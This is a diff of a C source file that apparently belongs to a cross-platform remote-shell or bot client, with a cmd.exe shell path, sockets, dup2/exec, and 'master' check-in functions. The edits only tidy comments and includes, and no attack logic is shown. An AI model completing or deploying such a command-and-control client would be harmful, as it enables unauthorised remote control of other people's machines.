@@ -6,15 +6,15 @@
 #define SLEEP_MAX 1
 #ifdef _WIN32
     #warning "Compiling for Windows!"
-    #define __windows__ //consistency
+    #define __windows__ // consistency
     #define SHELL "C:\\windows\\system32\\cmd.exe"
     #define OS "Windows"
     #define ID_CMD "VER"
-    #include <windows.h> //windows stuff
-    #include <io.h> //dup2
-    #include <process.h> //exec
-    #include <winsock2.h> //sockets
-    #include <ws2tcpip.h>
+    #include <windows.h> // windows stuff
+    #include <io.h> // dup2
+    #include <process.h> // exec
+    #include <winsock2.h> // sockets
+    #include <ws2tcpip.h> 
     #include <iphlpapi.h>
     #pragma comment(lib,"ws2_32.lib")
 
@@ -32,20 +32,20 @@
     } ADDRINFOA, *PADDRINFOA;
      
     typedef struct sockaddr {
-    #if (_WIN32_WINNT < 0x0600)
+    #if (_WIN32_WINNT < 0x0600) // got dammit windows
         u_short sa_family;
     #else 
         ADDRESS_FAMILY sa_family;
-    #endif //(_WIN32_WINNT < 0x0600)
+    #endif
         CHAR sa_data[14];
     } SOCKADDR, *PSOCKADDR, FAR *LPSOCKADDR;
     
     typedef struct sockaddr_in {
-    #if(_WIN32_WINNT < 0x0600)
+    #if(_WIN32_WINNT < 0x0600) // god dammit windows
         short   sin_family;    
-    #else //(_WIN32_WINNT < 0x0600)
+    #else
         ADDRESS_FAMILY sin_family;
-    #endif //(_WIN32_WINNT < 0x0600)
+    #endif
         USHORT sin_port;
         IN_ADDR sin_addr;
         CHAR sin_zero[8];
@@ -76,8 +76,7 @@
     #include <arpa/inet.h> //inet_ntoa
     #include <netinet/in.h> //in_addr
     #include <sys/socket.h> //socket
-    #include <sys/wait.h>
-    #include <strings.h>
+    #include <sys/wait.h> //technically not needed, will need in future when streaming data
     #include <string.h> //strlen
 #elif __unix__
     #warning "Compiling for Unix!"
@@ -88,13 +87,14 @@
     #include <arpa/inet.h> //inet_ntoa
     #include <netinet/in.h> //in_addr
     #include <sys/socket.h> //socket
-    #include <sys/wait.h>
-    #include <strings.h>
+    #include <sys/wait.h> //wait
     #include <string.h> //strlen
 #else
 #   error "Unsupported OS"
 #endif
 
+
+// Function headers
 char *get_os();
 char *master_checkin(struct sockaddr_in master, char * data);
 int master_init(struct sockaddr_in *master);
